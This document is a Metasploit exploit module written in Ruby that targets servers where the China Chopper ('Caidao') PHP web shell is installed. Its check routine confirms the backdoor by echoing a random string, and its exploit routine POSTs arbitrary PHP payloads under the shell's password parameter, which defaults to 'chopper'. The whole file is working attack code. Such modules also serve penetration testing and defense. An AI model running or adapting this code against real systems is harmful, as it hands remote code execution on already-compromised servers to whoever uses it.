
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'              => 'Chinese Caidao PHP Backdoor Code Execution',
      'Description'       => %q{
        This module exploits chinese caidao php backdoor.
      },
      'License'           => MSF_LICENSE,
      'Author'            => ['Nixawk'],
      'References'        =>
        [
          ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html'],
          ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html']
        ],
      'Payload'           =>
        {
          'BadChars'      => '\x00',
        },
      'Platform'          => ['php'],
      'Arch'              => ARCH_PHP,
      'Targets'           =>
        [
          ['Automatic', {}]
        ],
      'Privileged'        => false,
      'DisclosureDate'    => 'Oct 27 2015',
      'DefaultTarget'     => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path of backdoor', '/caidao.php']),
        OptString.new('PASSWORD', [true, 'The password of backdoor', 'chopper'])
      ], self.class)
  end

  def http_send_command(code)
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path),
      'vars_post' => {
        "#{datastore['PASSWORD']}" => code
      }
    })
    unless res && res.code == 200
      fail_with(Failure::Unknown, 'Failed to execute the code.')
    end
    res
  end

  def check
    flag = Rex::Text.rand_text_alpha(16)
    res = http_send_command("printf(\"#{flag}\");")
    if res && res.body =~ /#{flag}/m
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    http_send_command(payload.raw)
  end
end
